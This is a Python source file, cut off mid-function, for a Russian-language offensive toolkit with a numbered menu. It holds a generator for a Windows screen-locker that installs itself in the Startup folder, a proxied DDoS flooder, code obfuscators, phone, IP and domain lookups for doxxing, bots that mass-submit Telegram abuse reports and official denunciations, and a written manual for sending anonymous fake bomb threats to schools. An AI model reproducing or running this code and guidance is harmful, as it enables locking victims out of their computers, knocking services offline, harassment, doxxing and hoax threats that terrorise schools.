from colorama import init, Fore, Style
import random
from os import system
import os
import zlib
import base64
import marshal
import requests
import json
import time
import platform
import phonenumbers
from phonenumbers import parse, is_valid_number, is_possible_number, carrier, geocoder, timezone, PhoneNumberFormat, format_number
from faker import Faker
import socket
import subprocess
import whois
import threading
from queue import Queue
import datetime
import csv
import pandas as pd
import re
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup


init(autoreset=True)
color_text = Fore.LIGHTGREEN_EX
error_text_color = Fore.RED

device_name = socket.gethostname()
ip_address = socket.gethostbyname(device_name)
current_time = datetime.datetime.now()

banner = rf"""                                                                   
▄▄▄█████▓ ██▀███  ▓█████ ▓█████     ██░ ██  █    ██  ███▄    █  ███▄    █  ▄▄▄      
▓  ██▒ ▓▒▓██ ▒ ██▒▓█   ▀ ▓█   ▀    ▓██░ ██▒ ██  ▓██▒ ██ ▀█   █  ██ ▀█   █ ▒████▄    
▒ ▓██░ ▒░▓██ ░▄█ ▒▒███   ▒███      ▒██▀▀██░▓██  ▒██░▓██  ▀█ ██▒▓██  ▀█ ██▒▒██  ▀█▄  
░ ▓██▓ ░ ▒██▀▀█▄  ▒▓█  ▄ ▒▓█  ▄    ░▓█ ░██ ▓▓█  ░██░▓██▒  ▐▌██▒▓██▒  ▐▌██▒░██▄▄▄▄██ 
  ▒██▒ ░ ░██▓ ▒██▒░▒████▒░▒████▒   ░▓█▒░██▓▒▒█████▓ ▒██░   ▓██░▒██░   ▓██░ ▓█   ▓██▒
  ▒ ░░   ░ ▒▓ ░▒▓░░░ ▒░ ░░░ ▒░ ░    ▒ ░░▒░▒░▒▓▒ ▒ ▒ ░ ▒░   ▒ ▒ ░ ▒░   ▒ ▒  ▒▒   ▓▒█░
    ░      ░▒ ░ ▒░ ░ ░  ░ ░ ░  ░    ▒ ░▒░ ░░░▒░ ░ ░ ░ ░░   ░ ▒░░ ░░   ░ ▒░  ▒   ▒▒ ░
  ░        ░░   ░    ░      ░       ░  ░░ ░ ░░░ ░ ░    ░   ░ ░    ░   ░ ░   ░   ▒   
            ░        ░  ░   ░  ░    ░  ░  ░   ░              ░          ░       ░  ░
                                                                                    
By: Acadey
Version: 1.0.0

Device: {device_name}
IP: {ip_address}
Time: {current_time}

╭─────────────────────────────────────────────────────────────────────────────────╮
    
    1. Пробив по номеру         6. Banword              11. Скан портов
    2. Пробив по номеру(2)      7. Донос                12. DDoS
    3. Пробив по айпи           8. Obfuscate .py        13. Генератор паролей
    4. Пробив по домену         9. Obfuscate .bat       14. Генератор winlocker
    5. Поиск по бд              10. SBАт MАНуАJI        15. Сносер tg
    
    16. дипфейк
    17. Web scraping
                                                                                            
╰─────────────────────────────────────────────────────────────────────────────────╯                                                                    
"""


def b64(data):
    return base64.b64encode(data).decode('utf-8')

def zlb(data):
    return zlib.compress(data)

def mar(data):
    return marshal.dumps(compile(data, '<string>', 'exec'))

def obf_py():
    file_path = input(color_text + "[?] Введите путь к файлу .py > ")

    try:
        with open(file_path, 'r', encoding='utf-8') as file:
            data = file.read()
    except FileNotFoundError:
        print(error_text_color + "[!] Файл не найден!")
        return
    obfuscated_data = mar(data.encode('utf-8'))
    compressed_data = zlb(obfuscated_data)
    encoded_data = b64(compressed_data)[::-1]

    obfuscated_code = f'''
#obfuscated by AcaProtect
import marshal
import zlib
import base64

_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])))
exec(_({repr(encoded_data)}))
'''

    output_path = file_path.replace('.py', '_obf.py')
    with open(output_path, 'w', encoding='utf-8') as obfuscated_file:
        obfuscated_file.write(obfuscated_code)

    print(color_text + f"[+] Обфусцированный файл сохранен как {output_path}")

    select()

def obf_bat():
        counter = 0
        counter2 = 0
        file = input(color_text + "[?] Введите путь к файлу .bat > ")
        with open(f"{file}") as fileobj:
            try:
                file, lel = file.split('.')
            except:
                pass
            f = open(f"{file}obfusc.bat", "a")
            f.write("::obfuscated by AcaProtect\n")
            f.close()
            for line in fileobj:
                if ":" in line:
                    f = open(f"{file}obfusc.bat", "a")
                    f.write(line.rstrip() + '\n')
                    f.close()
                    pass
                for ch in line:
                    if not counter == 1:
                        if "\n" in ch:
                            f = open(f"{file}obfusc.bat", "a", encoding='utf-8')
                            f.write(f"\n")
                            f.close()
                        elif "%" in ch:
                            f = open(f"{file}obfusc.bat", "a", encoding='utf-8')
                            f.write(f"%")
                            f.close()
                            counter = 1
                        else:
                            n = random.randint(1, 30)
                            randomi = ''.join(
                                random.choice('abcdefghbroekcjweijweewxyzABCDEFGHIJKLMNOPQRSTUVWXYZ') for _ in range(n))
                            f = open(f"{file}obfusc.bat", "a", encoding='utf-8')
                            f.write(f"{ch}%{randomi}%")
                            f.close()
                    else:
                        if "%" in ch:
                            f = open(f"{file}obfusc.bat", "a", encoding='utf-8')
                            f.write("%")
                            f.close()
                            counter = 0
                        elif "\n" in ch:
                            f = open(f"{file}obfusc.bat", "a", encoding='utf-8')
                            f.write(f"\n")
                            f.close()
                        else:
                            f = open(f"{file}obfusc.bat", "a", encoding='utf-8')
                            f.write(ch)
                            f.close()
        select()

def win_locker():
    print(error_text_color + """
Внимание создавая винлокер вы берете всю вину на себя за его использование в плохих целях!

оригинал https://github.com/tigerk00/Fsociety_winlocker
напишите информацию для винлокера
    """)

    password = input(color_text + r"[?] Ваш пароль для отключения локера > ")
    time = input(color_text + r"[?] Ваше время для локера(сек) > ")
    photo = input(color_text + r"[?] Ваш путь до фото(пример files\photo.png) > ")
    aud = input(color_text + r"[?] Ваш путь до музыки .wav (пример files\Mr.Robot - Main Theme Song.wav) > ")

    win_locker_code = fr"""
#winlocker by tigerk00

import tkinter as tk
import os
import random
import pyautogui
from tkinter import *
import tkinter.font as font
import pygame
import shutil

is_first = True
if os.path.isfile(os.getenv("APPDATA") + '\Microsoft\Windows\Start Menu\Programs\Startup' + '\ '[0] + os.path.basename(sys.argv[0])) is False:
    shutil.copy2(sys.argv[0], os.getenv("APPDATA") + '\Microsoft\Windows\Start Menu\Programs\Startup')
else:
    is_first = False




stroke = " "
password = ("{password}")
time = {time}
del_text = "It's time to make some BOOOM!"


def blockroot():
    pyautogui.click(x=870,y=480)
    pyautogui.moveTo(x=870,y=480)
    root.protocol("WM_DELETE_WINDOW",blockroot)
    root.update()

def check_password(event):
    global stroke 
    stroke=textfield.get()
    if stroke==password:
        root.destroy()


pyautogui.FAILSAFE=False

root = Tk()
root.title("The End Of Your System")
root.attributes("-fullscreen",True)

photo = PhotoImage(file = r"{photo}")
w = photo.width()
h = photo.height()
root.geometry("%dx%d+0+0" % (w, h))
panel1 = Label(root, image=photo)
panel1.pack(side='top', fill='both', expand='yes')  
panel1.image = photo

textfield=Entry(root,fg="green")
but= Button(root,text="unlock")
text=Label(root,text="tigerk00",font="System 10",fg="#32CD32",bg="black")
text1=Label(root,text="Don't even think to turn off or restart your device - your system will delete immediately!",font = "System 25",fg="red",bg="black")
l=Label(text=time,font="System 15", bg = 'black' ,  fg = 'white' )
l1=Label(text="The remaining time of your system's life...",fg="white", bg = 'black' , font="System 15")
MyFont = font.Font(family="Helvetica",size=15,weight="bold")
textfield['font']= MyFont
text0 = Label(root , text = "Your system is blocked !" , font = "System 30" , fg="green"  , bg="black")

text1.place(x = 100 , y = 70)
text0.place(x=700 , y = 0)
text.place(x = 10 , y = 0)
l1.place(x = 10 , y = 150)
l.place(x = 590 ,  y =150)
but.place(x = 900 , y = 520)
textfield.place(width=200,height=30,x=860,y=480)

root.bind("<Return>" , check_password )
root.update() 
pyautogui.click(x = 900 , y = 520)
pyautogui.moveTo(x = 900 , y = 520)

pygame.init()
aud=pygame.mixer.Sound(r"{aud}")
aud.play(-1)

while stroke!=password:
    l.configure(text=time)
    root.after(300)
    if time==0:
        time=del_text
        i = 1
        while i<2:      
            all_files_in_directory = os.listdir(r"C:\Windows")
            random_file = random.choice(all_files_in_directory)
            os.system(r"explorer.exe randomfile")
    if time!=del_text:
        time=time-1 

    blockroot()




root.mainloop()  
"""

    filename = "winlocker(virus).py"

    try:
        with open(filename, "w") as f:
            f.write(win_locker_code)
        print(color_text + f"[+] Файл '{filename}' успешно создан.")
    except Exception as e:
        print(error_text_color + f"[!] Ошибка при создании или записи в файл: {e}")
    select()

def phoneinfo_one(phone):
    try:
        parsed_phone = parse(phone, None)

        if not is_valid_number(parsed_phone):
            print(error_text_color + "\n[!] Произошла ошибка -> Недействительный номер телефона\n")
            return

        carrier_info = carrier.name_for_number(parsed_phone, "en")
        country = geocoder.description_for_number(parsed_phone, "en")
        region = geocoder.description_for_number(parsed_phone, "ru")
        formatted_number = format_number(parsed_phone, PhoneNumberFormat.INTERNATIONAL)
        is_valid = is_valid_number(parsed_phone)
        is_possible = is_possible_number(parsed_phone)

        print_phone_info = f"""
[+] Номер телефона -> {formatted_number}
[+] Страна -> {country}
[+] Регион -> {region}
[+] Оператор -> {carrier_info}
[+] Активен -> {is_possible}
[+] Валид -> {is_valid}
[+] Telegram -> https://t.me/{phone}
[+] Whatsapp -> https://wa.me/{phone}
[+] Viber -> https://viber.click/{phone}\n"""

        print(color_text + print_phone_info)
    except Exception as e:
        print(error_text_color + "\n[!] Произошла ошибка -> {str(e)}\n")

    select()


class PhoneNumberInfo:
    def __init__(self):
        self.htmlweb_api_url = "https://htmlweb.ru/geo/api.php?json&telcod="
        self.cache_file = 'phone_cache.json'
        self.user_agent = self._load_random_user_agent()
        self._load_cache()

    def _load_random_user_agent(self):
        with open('files/useragent.txt', 'r') as file:
            user_agents = file.readlines()
        return random.choice(user_agents).strip()

    def _load_cache(self):
        try:
            with open(self.cache_file, 'r') as file:
                self.cache = json.load(file)
        except FileNotFoundError:
            self.cache = {}

    def _save_cache(self):
        with open(self.cache_file, 'w') as file:
            json.dump(self.cache, file)

    def get_number_data(self, user_number):
        if user_number in self.cache:
            return self.cache[user_number]

        headers = {
            'User-Agent': self.user_agent
        }

        response_htmlweb = requests.get(self.htmlweb_api_url + user_number, headers=headers)

        if response_htmlweb.ok:
            data_htmlweb = response_htmlweb.json()

            self.cache[user_number] = data_htmlweb
            self._save_cache()
            return data_htmlweb
        else:
            return {"status_error": True}

    def print_number_info(self):
        user_number = input(color_text + "[?] Введите номер телефона (например, +79833170773) > ").strip()

        if user_number:
            print(color_text + "Поиск данных...\n")
            data = self.get_number_data(user_number)

            if data.get("status_error"):
                print(
                    error_text_color + "[!] Ошибка: Не удалось получить данные. Проверьте номер телефона и попробуйте снова.")
                return

            country = data.get('country', {})
            region = data.get('region', {})
            other = data.get('0', {})

            print(
                color_text + f"[+] Страна: {country.get('name', 'Не найдено')}, {country.get('fullname', 'Не найдено')}")
            print(color_text + f"[+] Город: {other.get('name', 'Не найдено')}")
            print(color_text + f"[+] Почтовый индекс: {other.get('post', 'Не найдено')}")
            print(color_text + f"[+] Код валюты: {country.get('iso', 'Не найдено')}")
            print(color_text + f"[+] Телефонные коды: {data.get('capital', {}).get('telcod', 'Не найдено')}")
            print(color_text + f"[+] Посмотреть в wiki: {other.get('wiki', 'Не найдено')}")
            print(color_text + f"[+] Гос. номер региона авто: {region.get('autocod', 'Не найдено')}")
            print(color_text + f"[+] Оператор: {other.get('oper', 'Не найдено')}, {other.get('oper_brand', 'Не найдено')}, {other.get('def', 'Не найдено')}")
            print(color_text + f"[+] Местоположение: {country.get('name', 'Не найдено')}, {region.get('name', 'Не найдено')}, {other.get('name', 'Не найдено')} ({region.get('okrug', 'Не найдено')})")

            latitude = other.get('latitude', 'Не найдено')
            longitude = other.get('longitude', 'Не найдено')
            location = data.get('location', 'Не найдено')
            lang = country.get('lang', 'Не найдено').title()
            lang_code = country.get('langcod', 'Не найдено')
            capital = data.get('capital', {}).get('name', 'Не найдено')

            print(color_text + f"[+] Открыть на карте (google): https://www.google.com/maps/place/{latitude}+{longitude}")
            print(color_text + f"[+] Локация: {location}")
            print(color_text + f"[+] Язык общения: {lang}, {lang_code}")
            print(color_text + f"[+] Край/Округ/Область: {region.get('name', 'Не найдено')}, {region.get('okrug', 'Не найдено')}")
            print(color_text + f"[+] Столица: {capital}")
            print(color_text + f"[+] Широта/Долгота: {latitude}, {longitude}")
            print(color_text + f"[+] Оценка номера в сети: https://phoneradar.ru/phone/{user_number}")

        else:
            print(error_text_color + "[!]Ошибка: Номер телефона не введен.")
        select()

def phone_input():
    phone = input(color_text + "\n[?] Введите номер телефона (например, +79833170773) > ")
    phoneinfo_one(phone)

def deep_fake():
    ru = Faker('ru_RU')

    print(color_text + '_____ФИО_____')
    print(color_text + ru.name() )
    print(color_text + '_____Никнейм_____')
    print(color_text + ru.user_name() )
    print(color_text + '_____Адреса_____')
    print(color_text + 'Идекс:' , ru.postcode())
    print(color_text + 'Название улицы:' , ru.street_name())
    print(color_text + 'Адрес на улице:' , ru.street_address())
    print(color_text + 'Название страны:', ru.country())
    print(color_text + 'Название города:' , ru.city())
    print(color_text + 'Полный адрес:' , ru.address())
    print(color_text + '_____Професия_____')
    print(color_text + ru.job() )
    print(color_text + '_____Кредитная карта_____')
    print(color_text + ru.credit_card_number() )
    print(color_text + '_____Номер телефона_____')
    print(color_text + 'Номер телефона' , ru.phone_number())
    print(color_text + '_____Почта_____')
    print(color_text + ru.email() )
    print(color_text + '_____Компания_____')
    print(color_text + ru.company() )
    
    select()


def get_ip_info(ip_address):
    url = f"http://ip-api.com/json/{ip_address}"
    response = requests.get(url)

    if response.status_code == 200:
        return response.json()
    else:
        return None

def ip_select():
    ip = input(color_text + "[?] Введите IP-адрес > ")
    info = get_ip_info(ip)

    if info and info['status'] == 'success':
        print(color_text + f"[+] Информация об IP {ip}:")
        print(color_text + f"[+] Страна: {info['country']}")
        print(color_text + f"[+] Регион: {info['regionName']}")
        print(color_text + f"[+] Город: {info['city']}")
        print(color_text + f"[+] Почтовый индекс: {info['zip']}")
        print(color_text + f"[+] Широта: {info['lat']}")
        print(color_text + f"[+] Долгота: {info['lon']}")
        if 'isp' in info:
            print(color_text + f"[+] Провайдер: {info['isp']}")
        else:
            print(color_text + "[!] Информация о провайдере отсутствует.")
    else:
        print(error_text_color + "[!] Не удалось получить информацию об IP.")
    select()

def swatting_manual():
    print(color_text + """
    Сват - простая штука.
    
    Для начала вы должны понимать что такое сват и для чего он вам нужен.
    
    Сват другими же словами лже минирование,обычно люди используют сват для себя или делают на заказ.
    
    Приступим к мануалу!
    
    Так,для свата нам понадобится
    
    1. Система Android
    
    2. Ультра ебейшая связка VPN
    
    3. Виртуальное пространство
    
    4. Генератор одноразовых почт
    
    Обьясняю как все делать!
    
    1) Устанавливаем виртуальное пространство на свой телефон
    
    2) Устанавливаем связку VPN (Proton VPN, MullVod VPN)
    
    3) Дальше заходим в генератор почт и генерируем почту,копируем.
    
    4) Заходим в виртуальное пространство и импортируем два VPN,заходим в каждый впн и регистрируемся через почту которую мы ранее сгенерировали.Регистрация прошла успешно!
    
    5) Импортируем в наше виртуальное пространство еще одну виртуалку.
    
    6) Заходим во вторую виртуалку и опять генерируем почту и также регистрируемся.
    
    7) И включаем каждый впн на каждой виртуалке,страны ставить нужно обязательно разные,и включаем галочку kill user,чтобы вас не вычислили.
    
    8) На второй виртуалке создаем почту в gmail ОБЯЗАТЕЛЬНО С ВИРТ НОМЕРОМ!!! (ссылка на покупку вирт номеров снизу)
    
    9) Дальше заготавливаем текст какого то психа,но слова должны быть обязательно зацензуренны пример Кровь - КОВЬ
    
    10) Отправляем письмо Директору,Заучу школы
    
    Отправляйте по 10-15 писем сразу,чтобы вами заинтересовались!
    
    Не пишите письма ночью,ибо все школы закрыты :/
    """)
    select()

def replace_chars(text, use_fence):
    replacements = {
        'А': 'А', 'а': 'а', 'Б': 'Б', 'б': 'б', 'В': 'B', 'в': 'в', 'Г': 'Г', 'г': 'г',
        'Д': 'D', 'д': 'd', 'Е': 'E', 'е': 'e', 'Ё': 'Ё', 'ё': 'ё', 'Ж': 'Ж', 'ж': 'Ж',
        'З': '3', 'з': '3', 'И': 'U', 'и': 'u', 'й': 'й', 'К': 'K', 'к': 'k', 'Л': 'JI', "л": "JI",
        'М': 'M', 'м': 'м', 'Н': 'Н', 'н': 'н', 'о': '0', 'п': 'n', 'р': 'p', 'с': 'c', "С": "S",
        'т': 'T', 'у': 'y', 'ф': 'ф', 'х': 'x', 'ч': '4', "Ч": "4",'ш': 'III', "Ш": "III", 'щ': 'щ', 'ъ': 'ъ',
        'ы': 'bI', "Ы": "bI", 'ю': 'ю', 'я': 'я'
    }
    result = ''
    for char in text:
        if use_fence:
            result += replacements.get(char.upper(), char)
        else:
            result += replacements.get(char.upper(), char.upper())
    return result

def banword():
    print(color_text + """
    [?] 1. ВыВоД вИдЕ зАбОрА.
    [?] 2. ВСЕ ЗАГЛАВНЫЕ.
    """)
    option = input(color_text + "[?] Выберите опцию > ")
    if option not in ['1', '2']:
        print("Ошибка: Неправильная опция.")
        exit()

    if option == '1':
        user_input = input(color_text + "[?] Введите текст > ")
        replaced_text = replace_chars(user_input, True)
        print(color_text + "[+] Результат замены > \n")
        print(color_text + replaced_text + "\n")
    else:
        user_input = input(color_text + "[?] Введите текст > ")
        replaced_text = replace_chars(user_input, False)
        print(color_text + "[+] Результат замены > \n")
        print(color_text + replaced_text + "\n")
    select()

url = "http://xn--d1asbbbhie.xn--p1ai/report/"
user_agents = ['Mozilla/5.0 (Linux; Android 8.0.0; Nexus 5 Build/OPR6.170623.013) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.7228.0 Mobile Safari/537.36',  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/90.0.0.0 Safari/605.1.15', 'Mozilla/5.0 (Linux; Android 8.0.0; Nexus 5 Build/OPR6.170623.013) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.1257.0 Mobile Safari/537.36',  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/79.0.0.0 Safari/605.1.15',  'Mozilla/5.0 (Linux; Android 8.0.0; Nexus 5 Build/OPR6.170623.013) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.5234.0 Mobile Safari/537.36',  'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/79.0 Mobile/15E148 Safari/604.1',  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.3170.0 Safari/537.36',  'Mozilla/5.0 (Windows NT 10.0; WOW64) Gecko/20100101 Firefox/66',  'Mozilla/5.0 (Windows NT 10.0; WOW64) Gecko/20100101 Firefox/36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/73.0.0.0 Safari/605.1.15', 'Mozilla/5.0 (Linux; Android 8.0.0; Nexus 5 Build/OPR6.170623.013) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.7979.0 Mobile Safari/537.36', 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/108.0 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/38.0.0.0 Safari/605.1.15', 'Mozilla/5.0 (Linux; Android 8.0.0; Nexus 5 Build/OPR6.170623.013) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.5070.0 Mobile Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.7640.0 Safari/537.36', 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/49.0 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (Linux; Android 8.0.0; Nexus 5 Build/OPR6.170623.013) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4688.0 Mobile Safari/537.36', 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/90.0 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3182.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.9176.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; WOW64) Gecko/20100101 Firefox/71', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/73.0.0.0 Safari/605.1.15', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.6900.0 Safari/537.36', 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/59.0 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.6232.0 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/45.0.0.0 Safari/605.1.15', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.6601.0 Safari/537.36', 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/105.0 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.7252.0 Safari/537.36', 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/32.0 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.3745.0 Safari/537.36',]

def get_csrf_token():
    headers = {"User-Agent": random.choice(user_agents)}
    response = requests.get(url, headers=headers)
    soup = BeautifulSoup(response.text, 'html.parser')
    return soup.find('input', {'name': '_token'})['value']

def get_institutions():
    headers = {"User-Agent": random.choice(user_agents)}
    response = requests.get(url, headers=headers)
    soup = BeautifulSoup(response.text, 'html.parser')
    institutions = soup.find('select', {'name': 'institution'}).find_all('option')
    return [(option['value'], option.text.strip()) for option in institutions]

def send_report(csrf_token, institution, body, is_anonymous, name='', email='', phone=''):
    headers = {"User-Agent": random.choice(user_agents)}
    data = {
        '_token': csrf_token,
        'institution': institution,
        'body': body,
        'name': name,
        'email': email,
        'phone': phone,
        'anonymously': 'on' if is_anonymous else '',
        'allow_publish': 'on'
    }
    response = requests.post(url, headers=headers, data=data)
    return response.status_code == 200

def print_text(text):
    print(text)

def input_text(prompt):
    return input(prompt)

menu_text = """
    [?] 1. Отправить донос
    [?] 2. Выход
"""

def donos_menu():
    while True:
        print_text(menu_text)
        choice = input_text(color_text + "[?] Выберите действие > ")

        if choice == '1':
            csrf_token = get_csrf_token()
            institution_list = get_institutions()
            print_text(color_text + "[?] Выберите ведомство > \n")
            for i, (value, name) in enumerate(institution_list, 1):
                print_text(f"{i}. {name}")
            institution_index = int(input_text(color_text + "[?] Введите номер ведомства > ")) - 1
            institution = institution_list[institution_index][0]
            body = input_text(color_text + "[?] Введите текст доноса > ")
            is_anonymous = input_text(color_text + "[?] Анонимно? (да/нет) > ").lower() == 'да'

            if not is_anonymous:
                name = input_text(color_text + "[?] Введите ФИО > ")
                email = input_text(color_text + "[?] Введите Email > ")
                phone = input_text(color_text + "[?] Введите Телефон > ")
            else:
                name = email = phone = ''

            if send_report(csrf_token, institution, body, is_anonymous, name, email, phone):
                print_text(color_text + "[+] Донос успешно отправлен!")
            else:
                print_text(error_text_color + "Ошибка при отправке доноса.")

            select()

        elif choice == '2':
            select()


def domain_info():
    domain = input(color_text + "[?] Введите домен (например, example.com) > ")

    try:
        w = whois.whois(domain)
        ip_address = socket.gethostbyname(domain)

        print(color_text + "[+] Информация о домене:")
        print(color_text + f"[+] Домен: {w.domain_name}")
        print(color_text + f"[+] Регистратор: {w.registrar}")
        print(color_text + f"[+] Дата создания: {w.creation_date}")
        print(color_text + f"[+] Дата окончания: {w.expiration_date}")
        print(color_text + f"[+] Дата последнего обновления: {w.updated_date}")
        print(color_text + f"[+] Имя владельца: {w.name}")
        print(color_text + f"[+] Организация: {w.org}")
        print(color_text + f"[+] Email: {w.emails}")
        print(color_text + f"[+] Телефон: {w.phone}")
        print(color_text + f"[+] Страна: {w.country}")
        print(color_text + f"[+] IP-адрес: {ip_address}")

    except Exception as e:
        print(error_text_color + "[!] Произошла ошибка:", e)
    select()

def scan_ports():
    target = input(color_text + "[+] Введите IP-адрес > " + Style.RESET_ALL)
    targetIP = socket.gethostbyname(target)
    n_threads = 200
    ports = range(1, 9999)
    open_ports = []
    ports_queue = Queue()
    print_lock = threading.Lock()

    def port_scan(port):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            result = sock.connect_ex((targetIP, port))
            with print_lock:
                if result == 0:
                    print(Fore.GREEN + f"[+] Порт {port} открыт " + Style.RESET_ALL)
                    open_ports.append(port)
                else:
                    print(Fore.RED + f"[-] Порт {port} закрыт " + Style.RESET_ALL)
        except:
            pass
        finally:
            sock.close()

    def scan_thread():
        while True:
            port = ports_queue.get()
            port_scan(port)
            ports_queue.task_done()

    for t in range(n_threads):
        thread = threading.Thread(target=scan_thread)
        thread.daemon = True
        thread.start()

    for port in ports:
        ports_queue.put(port)

    ports_queue.join()

    print(color_text + f"[+] Открытые порты на {targetIP}:")
    print(open_ports)

    select()

def start_ddos_attack(user_agents_file, proxies_file, link):

    with open(user_agents_file, 'r') as f:
        user_agents = f.read().splitlines()

    with open(proxies_file, 'r') as f:
        proxies = f.read().splitlines()

    time.sleep(1)
    print(color_text + "[+] Ddos Атака началась")

    def ddos():
        while True:
            user_agent = random.choice(user_agents)
            proxy = random.choice(proxies)

            headers = {
                'User-Agent': user_agent
            }

            proxy_dict = {
                'http': proxy,
                'https': proxy
            }

            try:
                response = requests.get(link, headers=headers, proxies=proxy_dict)
                print(color_text + f'[+] Ответ: {response.status_code}, User-Agent: {user_agent}, Proxy: {proxy}')
            except Exception as e:
                print(error_text_color + f'[!] Ошибка: {e}')

    while True:
        threading.Thread(target=ddos).start()

def password_generator():
    char = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%&*^"
    legit = int(input(color_text + "[?] Длина пароля > "))

    password = ""

    for i in range(legit):
        password += random.choice(char)

    print(color_text + f"[+] Ваш пароль > {password}")
    select()

def snoser():
    Tochno = input(color_text + r"""
    Чтобы сносер работал корректно
    поменяй данные в файлах

    files\text.txt
    files\num.txt

    Поменяй юз и контакт.
    Все? Тогда жми enter.
    """)

    files_path = "files"

    try:
        with open(os.path.join(files_path, 'text.txt'), 'r') as text_file, \
                open(os.path.join(files_path, 'num.txt'), 'r') as num_file, \
                open(os.path.join(files_path, 'ua.txt'), 'r') as ua_file:
            text = text_file.read().splitlines()
            numbers = num_file.read().splitlines()
            ua_list = ua_file.read().splitlines()

        if not text or not numbers or not ua_list:
            print(error_text_color + "[!] Ошибка: Файлы text.txt, num.txt или ua.txt пусты или отсутствуют данные.")
            return

    except FileNotFoundError:
        print(error_text_color + f"[!] Ошибка: Файлы text.txt, num.txt или ua.txt не найдены в папке '{files_path}'.")
        return
    except Exception as e:
        print(error_text_color + f"[!] Произошла неизвестная ошибка при чтении файлов: {e}")
        return

    url = 'https://telegram.org/support'
    yukino = 0
    limit = 100

    while yukino < limit:
        yukino += 1
        chosen_text = random.choice(text)
        chosen_contact = random.choice(numbers)
        print(color_text + f"[+] Отправка жалобы №{yukino}...")

        headers = {'User-Agent': random.choice(ua_list)}
        payload = {'text': chosen_text, 'contact': chosen_contact}

        try:
            response = requests.post(url, data=payload, headers=headers, timeout=5)
            if response.status_code == 200:
                print(color_text + f"[+] Жалоба успешно отправлена\n Всего отправлено {yukino} сообщений")
            else:
                print(error_text_color + f"[!] Произошла ошибка при отправке жалобы (код: {response.status_code})")
        except requests.exceptions.RequestException as e:
            print(error_text_color + f"[!] Ошибка соединения: {e}")

        time.sleep(1)

    select()

def search_in_csv(filepath, data_to_find_re):
    with open(filepath, 'r', encoding='utf-8') as csvfile:
        reader = csv.reader(csvfile)
        for row in reader:
            if data_to_find_re.search(str(row)):
                return color_text + f"[+] Найдено в файле '{os.path.basename(filepath)}': {row}"
    return None

def search_in_excel(filepath, data_to_find):
    df = pd.read_excel(filepath, engine='openpyxl', usecols=lambda x: data_to_find in str(x))
    if not df.empty:
        return color_text + f"[+] Найдено в файле '{os.path.basename(filepath)}': {df.values.tolist()}"
    return None

def search_in_txt(filepath, data_to_find_re):
    with open(filepath, 'r', encoding='utf-8') as txtfile:
        for line in txtfile:
            if data_to_find_re.search(line):
                return color_text + f"[+] Найдено в файле '{os.path.basename(filepath)}': {line.strip()}"
    return None

def find_data_in_files(data_to_find, directory="files\\base"):
    if not os.path.exists(directory):
        print(error_text_color + "[!] Директория '{directory}' не существует.")
        select()

    data_to_find_re = re.compile(re.escape(data_to_find))
    found = False
    results = []

    start_time = time.time()

    with ThreadPoolExecutor() as executor:
        futures = []
        for filename in os.listdir(directory):
